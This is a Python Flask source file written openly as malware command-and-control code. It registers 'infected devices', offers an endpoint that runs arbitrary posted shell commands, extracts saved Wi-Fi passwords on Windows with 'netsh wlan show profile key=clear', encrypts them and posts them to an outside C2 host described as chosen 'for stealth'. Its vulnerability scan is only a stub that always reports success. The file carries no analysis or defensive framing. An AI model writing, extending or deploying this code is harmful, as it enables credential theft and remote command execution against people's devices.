from flask import Flask, request, jsonify
from flask_restful import Api, Resource
import os
import threading
import requests
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import platform
import subprocess


# Generate RSA keys for secure communication
PRIVATE_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
PUBLIC_KEY = PRIVATE_KEY.public_key()

C2_SERVER = "https://dynamic-dns-server.com/api"  # Dynamic URL for stealth
infected_devices = {}


# RSA encryption function
def rsa_encrypt(data: str) -> bytes:
    return PUBLIC_KEY.encrypt(
        data.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )


class RegisterDevice(Resource):
    """Resource for registering infected devices."""

    def post(self):
        device_id = request.json.get("device_id")
        device_ip = request.remote_addr

        if not device_id:
            return {"error": "Device ID missing."}, 400

        infected_devices[device_id] = {"status": "infected", "ip": device_ip}
        threading.Thread(target=initiate_malware, args=(device_id,)).start()
        return {"message": "Device registered successfully."}, 201


class CommandExecutor(Resource):
    """Resource for executing commands on infected devices."""

    def post(self):
        command = request.json.get("command")
        if not command:
            return {"error": "No command provided."}, 400

        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return {"output": result.decode()}, 200
        except Exception as e:
            return {"error": str(e)}, 500


def initiate_malware(device_id):
    """Execute malicious tasks on the device."""
    if detect_vulnerabilities():
        data = steal_data()
        encrypted_data = rsa_encrypt(data)
        exfiltrate_data(device_id, encrypted_data)


def detect_vulnerabilities():
    """Simulate vulnerability detection."""
    # Use nmap or custom scanning logic here
    return True


def steal_data():
    """Extract sensitive data."""
    if platform.system() == "Windows":
        return subprocess.check_output("netsh wlan show profile key=clear", shell=True).decode()
    return "No sensitive data found."


def exfiltrate_data(device_id, data):
    """Send stolen data to C2."""
    try:
        requests.post(f"{C2_SERVER}/upload", files={"data": data})
    except requests.RequestException:
        pass

